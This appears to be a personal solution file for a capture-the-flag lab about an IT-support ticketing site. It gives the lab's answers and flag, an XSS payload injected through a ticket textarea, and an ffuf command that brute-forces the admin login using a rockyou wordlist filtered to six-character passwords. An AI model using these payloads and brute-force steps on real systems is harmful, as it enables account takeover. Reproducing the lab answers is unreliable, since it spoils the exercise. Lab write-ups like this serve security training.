@@ -1,0 +1,21 @@
+
+																	Task:1 Lab Information 
+																-------------------------------
+
+1. What is IT Supports email address?
+ans: adminaccount@itsupport.thm
+solution: first register your email and login
+solution: then create a ticket with xss payload
+payload: </textarea><script>alert(1)</script>
+solution: create a final payload to send in new ticket
+command: cat payload.js
+
+2. Admin users password
+ans: 123123
+command: grep -E '^.{6}$' /usr/share/wordlists/rockyou.txt > pass.txt (because pass length is 6 char see in the question)
+command: ffuf -c -u 'http://10.10.110.94/login' -X POST -d 'email=adminaccount@itsupport.thm&password=FUZZ' 
+         -H 'Content-Type: application/x-www-form-urlencoded' -w pass.txt -mc all -fc 401
+
+3. Flag inside Ticket 1
+ans: THM{6804f45260135ec8418da2d906328473}
+solution: login with the creds we found and check ticket 1
